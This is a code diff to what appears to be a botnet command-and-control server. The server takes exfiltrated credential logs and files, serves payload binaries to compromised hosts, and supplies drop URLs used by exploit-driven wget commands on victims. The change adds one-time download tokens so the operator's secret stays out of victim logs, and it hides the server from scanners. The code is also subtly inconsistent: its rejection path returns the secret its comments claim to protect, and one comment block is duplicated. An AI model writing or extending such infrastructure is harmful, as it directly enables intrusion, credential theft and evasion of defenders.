@@ -7,6 +7,7 @@ so the real fleet and the sim fleet speak one protocol:
   POST <http_path>            heartbeat / command response  {"cmd":"status",...}
   POST <http_path>/exfil      credential-log / file exfil chunks
   GET  /bot/<name>            payload binary (payload_dir/<name>)
+  GET  /bot/token             one-time short-TTL download token (#190)
   GET  /notnet-src.tar        on-target compile source bundle
 
 State is SQLite. Operator commands go through a queue dir (same protocol as
@@ -23,6 +24,7 @@ import hmac
 import json
 import os
 import re
+import secrets
 import signal
 import socket
 import sqlite3
@@ -453,6 +455,41 @@ def _query_param(path, key):
     return ""
 
 
+# #190: single-use download tokens. The CVE/LOTL drop commands run busybox
+# wget on the VICTIM, so the fleet secret used to travel in the injected
+# shell command, the exploit request body, and victim logs (CWE-200). Now a
+# bot fetches a short-TTL one-time token (secret-authenticated) and puts
+# THAT in the drop URL; the C2 consumes it on first use.
+DL_TOKEN_TTL_S = 60
+
+
+def _dl_token_issue(c2):
+    """Mint a one-time download token, pruning expired ones."""
+    tok = secrets.token_urlsafe(32)
+    now = time.time()
+    with c2.dl_tokens_lock:
+        for k in [k for k, exp in c2.dl_tokens.items() if exp <= now]:
+            del c2.dl_tokens[k]
+        c2.dl_tokens[tok] = now + DL_TOKEN_TTL_S
+    return tok
+
+
+def _dl_token_consume(c2, tok):
+    """Validate + consume a download token (single use). Constant-time
+    compare against each live token; expired entries are pruned."""
+    if not tok:
+        return False
+    now = time.time()
+    with c2.dl_tokens_lock:
+        for k in [k for k, exp in c2.dl_tokens.items() if exp <= now]:
+            del c2.dl_tokens[k]
+        for k in list(c2.dl_tokens):
+            if hmac.compare_digest(k, tok):
+                del c2.dl_tokens[k]
+                return True
+    return False
+
+
 def handle_http(conn, addr, c2):
     ip = addr[0]
     try:
@@ -540,13 +577,33 @@ def handle_http(conn, addr, c2):
             # shared secret (?secret= on the URL, matching the bot's
             # http_get_url which appends it). Unauthenticated GETs get the
             # generic ok-ack so scanners learn nothing.
+            # #173: payload + source-tarball downloads now require the
+            # shared secret (?secret= on the URL, matching the bot's
+            # http_get_url which appends it). Unauthenticated GETs get the
+            # generic ok-ack so scanners learn nothing.
+            # #190: a single-use short-TTL download token (?token=) is also
+            # accepted — that is what drop URLs carry now, so the fleet
+            # secret never reaches the victim. The token is consumed on
+            # first use.
             if method == "GET" and (path == "/bot/notnet" or path == "/notnet-src.tar"
                                     or path.startswith("/bot/")):
                 # raw_path carries the query string — that's where the
                 # wget/curl ?secret= lives (headers have none).
-                if not _request_secret_ok(c2, headers, {"secret": _query_param(raw_path, "secret")}):
-                    log(f"PAYLOAD REJECT {ip} (no secret)")
+                secret_ok = _request_secret_ok(c2, headers,
+                                               {"secret": _query_param(raw_path, "secret")})
+                # don't burn a live token on a token-fetch request
+                token_ok = (False if path == "/bot/token"
+                            else _dl_token_consume(c2, _query_param(raw_path, "token")))
+                if not (secret_ok or token_ok):
+                    log(f"PAYLOAD REJECT {ip} (no secret/token)")
                     http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
+                    continue
+                log(f"PAYLOAD auth {ip} ({'token' if token_ok and not secret_ok else 'secret'})")
+                if path == "/bot/token":
+                    # #190: secret-authenticated one-time download token.
+                    tok = _dl_token_issue(c2)
+                    log(f"TOKEN issue -> {ip}")
+                    http_send(conn, json.dumps({"token": tok, "secret": c2.secret}))
                     continue
                 if path == "/bot/notnet":
                     http_send_file(conn, os.path.join(c2.payload_dir, "notnet"),
@@ -1144,6 +1201,9 @@ class C2:
         # loopback (enforced in main(), #136). When set, all /api/* and the
         # dashboard require it.
         self.console_token = console_token
+        # #190: live single-use download tokens (token -> expiry epoch).
+        self.dl_tokens = {}
+        self.dl_tokens_lock = threading.Lock()
         # Sim-integration mode (run_sim.py against the real C2):
         #  SIM_EVIDENCE  — write mock-format evidence lines to this file so
         #                  the sim driver's grep-based checks see them
